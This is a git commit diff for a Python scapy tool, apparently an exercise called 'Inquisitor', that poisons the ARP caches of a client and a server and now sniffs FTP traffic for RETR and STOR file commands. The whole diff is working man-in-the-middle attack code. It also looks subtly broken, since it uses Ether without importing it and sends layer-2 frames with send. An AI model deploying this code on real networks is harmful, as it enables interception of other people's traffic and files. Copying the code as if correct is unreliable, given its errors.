b81be64a8fd7f0aaf13acadaa96a5450d45c99e6
Moustik <81183216+MoustikBe@users.noreply.github.com>
2026-04-02 20:07:11 +0200

    adding the detection of files

--- Inquisitor/inquisitor.py
+++ Inquisitor/inquisitor.py
@@ -4,7 +4,7 @@ import sys
 import ipaddress
 import re
 import time
-from scapy.all import ARP, send
+from scapy.all import ARP, send, sniff, TCP, Raw
 
 class Inquisitor():
     def __init__(self, argument):
@@ -16,12 +16,21 @@ class Inquisitor():
 
     def send_poison(self):
         # Lying to the client #
-        poison_client = ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv)
+        poison_client = Ether(dst=self.mac_addr_host) / ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv)
         # Lying to the server #
-        poison_serv = ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host)
+        poison_serv = Ether(dst=self.mac_addr_serv) / ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host)
         # Sending through the Network #
         send(poison_client, verbose=False)
         send(poison_serv, verbose=False)
+
+    def packet_callback(self, packet):
+        if(packet.haslayer(Raw)):
+            try:
+                payload = packet[Raw].load.decode('utf-8', errors='ignore')
+                if "RETR" in payload or "STOR" in payload:
+                    print(f"[*] File founded : {payload.strip()}")
+            except:
+                pass
 
     def run(self):
         print("[*] Starting port forwording")
@@ -30,7 +39,7 @@ class Inquisitor():
             print("[*] Initalise the poison loop")
             while True:
                 self.send_poison()
-                time.sleep(2)
+                sniff(filter="tcp port 21", prn=self.packet_callback, store=0, timeout=2)
         except KeyboardInterrupt :
             print("[*] Poison loop has been manually stopped")
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
